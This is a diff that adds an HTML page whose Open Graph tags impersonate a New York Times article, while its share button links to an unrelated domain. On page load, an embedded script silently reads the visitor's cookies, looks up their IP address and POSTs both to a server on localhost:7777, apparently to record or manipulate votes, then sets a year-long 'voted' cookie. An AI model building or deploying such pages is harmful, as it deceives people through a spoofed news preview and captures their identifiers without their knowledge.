@@ -1,0 +1,70 @@
+<html>
+  <head>
+    <title>Your Website Title</title>
+    <!-- You can use Open Graph tags to customize link previews.
+    Learn more: https://developers.facebook.com/docs/sharing/webmasters -->
+    <meta
+      property="og:url"
+      content="http://www.nytimes.com/2015/02/19/arts/international/when-great-minds-dont-think-alike.html"
+    />
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="When Great Minds Don’t Think Alike" />
+    <meta
+      property="og:description"
+      content="How much does culture influence creative thinking?"
+    />
+    <meta
+      property="og:image"
+      content="http://static01.nyt.com/images/2015/02/19/arts/international/19iht-btnumbers19A/19iht-btnumbers19A-facebookJumbo-v2.jpg"
+    />
+  </head>
+  <body>
+    <script>
+      async function start() {
+        function setCookie(cname, cvalue, exdays) {
+          var d = new Date();
+          d.setTime(d.getTime() + exdays * 24 * 60 * 60 * 1000);
+          var expires = 'expires=' + d.toUTCString();
+          document.cookie = cname + '=' + cvalue + ';' + expires + ';';
+          return document.cookie;
+        }
+        function getIp() {
+          return fetch('https://api.ipify.org').then((res) => res.text());
+        }
+        console.log(document.cookie);
+        const option = fetch('http://localhost:7777/', {
+          method: 'POST',
+          body: JSON.stringify({
+            mentor: 1,
+            token: document.cookie,
+            ip: await getIp(),
+          }),
+        })
+          .then((res) => res.text())
+          .then((res) => setCookie('voted', res, 365));
+      }
+      start().then();
+    </script>
+    <!-- Load Facebook SDK for JavaScript -->
+    <div id="fb-root"></div>
+    <script>
+      (function(d, s, id) {
+        var js,
+          fjs = d.getElementsByTagName(s)[0];
+        if (d.getElementById(id)) return;
+        js = d.createElement(s);
+        js.id = id;
+        js.src =
+          'https://connect.facebook.net/en_US/sdk.js#xfbml=1&version=v3.0';
+        fjs.parentNode.insertBefore(js, fjs);
+      })(document, 'script', 'facebook-jssdk');
+    </script>
+
+    <!-- Your share button code -->
+    <div
+      class="fb-share-button"
+      data-href="https://gewtest.tk"
+      data-layout="button_count"
+    ></div>
+  </body>
+</html>
